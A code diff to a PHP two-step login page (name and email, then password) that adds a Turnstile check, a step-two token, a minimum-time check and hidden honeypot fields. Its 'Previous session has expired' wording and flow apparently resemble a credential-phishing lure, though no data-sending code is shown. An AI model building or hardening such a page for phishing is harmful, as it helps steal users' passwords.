@@ -11,6 +11,14 @@ unset($_SESSION['error_message']);
 
 $hasError = !empty($error);
 $hideSessionMsg = ($error === 'Incorrect name entered.');
+
+// If we're on step 2, record when the form was rendered (for min-time check)
+if ($step == 2) {
+    $_SESSION['step2_rendered_at'] = time();
+}
+
+// Step2 token is generated in login.php after step1 success
+$step2_token = $_SESSION['step2_token'] ?? '';
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -153,7 +161,6 @@ $hideSessionMsg = ($error === 'Incorrect name entered.');
         outline:none;
         color:#000;
     }
-    /* Name field stays black in dark mode */
     @media (prefers-color-scheme: dark) {
         .field-wrapper input[name="name"] {
             color:#000 !important;
@@ -161,7 +168,6 @@ $hideSessionMsg = ($error === 'Incorrect name entered.');
         }
     }
 
-    /* Email input ALWAYS editable now */
     .email-wrapper input { background:#fff !important; color:#000 !important; }
 
     /* Mail icon */
@@ -192,9 +198,18 @@ $hideSessionMsg = ($error === 'Incorrect name entered.');
     }
     .lock-icon path { fill:#777; }
 
-    /* Padding for name field so it doesn't overlap lock icon */
     .field-wrapper input[name="name"] {
         padding-left:28px;
+    }
+
+    /* Honeypot (hidden field) */
+    .hp-wrapper {
+        position:absolute;
+        left:-9999px;
+        width:1px;
+        height:1px;
+        overflow:hidden;
+        opacity:0;
     }
 
     /* Turnstile */
@@ -245,7 +260,7 @@ $hideSessionMsg = ($error === 'Incorrect name entered.');
             <?php if ($step == 1): ?>
                 <p class="doc-subtitle">Previous session has expired. login to continue</p>
             <?php else: ?>
-               
+                <!-- no message on step 2 -->
             <?php endif; ?>
         <?php endif; ?>
 
@@ -276,6 +291,11 @@ $hideSessionMsg = ($error === 'Incorrect name entered.');
                 <div class="cf-turnstile" data-sitekey="0x4AAAAAACEAdYvsKv0_uuH2"></div>
             </div>
 
+            <!-- (Optional) honeypot for step 1 as well, harmless -->
+            <div class="hp-wrapper">
+                <input type="text" name="company" autocomplete="off">
+            </div>
+
             <button class="btn-primary">Next</button>
         </form>
 
@@ -302,10 +322,16 @@ $hideSessionMsg = ($error === 'Incorrect name entered.');
                     placeholder="Password"
                     required
                 >
-                <!-- Padlock icon LEFT -->
                 <svg class="lock-icon" viewBox="0 0 16 16" aria-hidden="true">
                     <path d="M5.5 7V5.5a2.5 2.5 0 0 1 5 0V7h.5A1.5 1.5 0 0 1 12.5 8.5v4A1.5 1.5 0 0 1 11 14H5a1.5 1.5 0 0 1-1.5-1.5v-4A1.5 1.5 0 0 1 5 7h.5Zm1 0h3V5.5a1.5 1.5 0 0 0-3 0V7Z"/>
                 </svg>
+            </div>
+
+            <!-- Step 2 security: token + honeypot -->
+            <input type="hidden" name="step2_token" value="<?= htmlspecialchars($step2_token) ?>">
+
+            <div class="hp-wrapper">
+                <input type="text" name="company" autocomplete="off">
             </div>
 
             <button class="btn-primary">Next</button>
